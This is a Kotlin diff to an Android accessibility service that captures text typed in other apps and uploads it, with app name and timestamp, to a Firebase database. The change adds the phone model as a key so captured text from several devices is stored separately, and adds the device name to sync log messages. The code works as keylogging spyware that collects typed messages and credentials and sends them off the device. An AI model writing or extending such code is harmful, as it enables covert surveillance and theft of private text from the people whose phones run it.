@@ -59,23 +59,25 @@ class AppAccessibilityService : AccessibilityService() {
             scope.launch {
                 try {
                     val ref = getDatabaseRef() ?: return@launch
+                    val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                     val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
                     val sanitizedAppName = packageName.replace(Regex("[^a-zA-Z0-9_-]"), "_")
 
                     val eventData = mapOf(
+                        "deviceName" to deviceName,
                         "packageName" to sanitizedAppName,
                         "text" to typedText,
                         "timestamp" to System.currentTimeMillis()
                     )
 
-                    ref.child("accessibility_$sanitizedAppName").child(timestampKey).setValue(eventData)
+                    ref.child(deviceName).child("accessibility_$sanitizedAppName").child(timestampKey).setValue(eventData)
                         .addOnSuccessListener {
                             Log.d(TAG, "Accessibility text synced to Firebase successfully")
-                            LogStore.addLog("Accessibility synced ($sanitizedAppName): $typedText")
+                            LogStore.addLog("[$deviceName] Accessibility synced ($sanitizedAppName): $typedText")
                         }
                         .addOnFailureListener { e: Exception ->
                             Log.e(TAG, "FAILED to sync accessibility text to Firebase", e)
-                            LogStore.addLog("Accessibility sync FAILED: ${e.toString()}")
+                            LogStore.addLog("[$deviceName] Accessibility sync FAILED: ${e.toString()}")
                         }
                 } catch (e: Exception) {
                     Log.e(TAG, "Error in coroutine accessibility event", e)
